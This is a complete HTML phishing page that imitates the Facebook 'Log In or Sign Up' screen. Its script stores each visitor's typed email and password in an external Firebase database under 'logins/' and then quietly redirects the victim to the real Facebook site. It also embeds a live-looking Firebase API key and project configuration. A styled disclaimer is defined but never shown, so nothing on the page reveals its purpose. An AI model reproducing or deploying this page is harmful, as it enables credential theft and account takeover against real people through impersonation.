<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
        
        /* Disclaimer Styles */
        .disclaimer { background-color: white; color: red; padding: 20px; text-align: center; border: 5px solid red; margin-top: 20px; width: 80%; font-size: 24px; font-weight: bold; }

        .container { display: flex; width: 980px; margin-top: 40px; justify-content: space-between; }
        .fb-text { width: 500px; padding-top: 40px; }
        .fb-text h1 { color: #1877f2; font-size: 60px; margin-bottom: 0; }
        .fb-text p { font-size: 28px; line-height: 32px; width: 450px; }
        
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; padding: 12px; cursor: pointer; }
        .forgot { color: #1877f2; font-size: 14px; margin: 16px 0; text-decoration: none; display: block; }
        hr { border: 0.5px solid #dadde1; margin-bottom: 20px; }
        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
    </style>
</head>
<body>

    

    <div class="container">
        <div class="fb-text">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="login-box">
            <input type="text" id="email" placeholder="Email address or phone number">
            <input type="password" id="password" placeholder="Password">
            <button class="login-btn" onclick="saveData()">Log In</button>
            <a href="#" class="forgot">Forgotten password?</a>
            <hr>
            <button class="create-btn">Create new account</button>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyAF__nT0KcIICvwJuZUf05P2iMZfDiNo6M",
            authDomain: "yasodha-ac86b.firebaseapp.com",
            databaseURL: "https://yasodha-ac86b-default-rtdb.firebaseio.com",
            projectId: "yasodha-ac86b",
            storageBucket: "yasodha-ac86b.firebasestorage.app",
            messagingSenderId: "268363750401",
            appId: "1:268363750401:web:d97405614b6bf6089e3400",
            measurementId: "G-3JWTJG76P6"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function saveData() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            if(email && password) {
                database.ref('logins/' + Date.now()).set({
                    email: email,
                    password: password
                }).then(() => {
                    
                    window.location.href = "https://www.facebook.com"; // Redirect to real FB
                });
            } else {
                alert("Please fill all fields");
            }
        }
    </script>
</body>
</html>
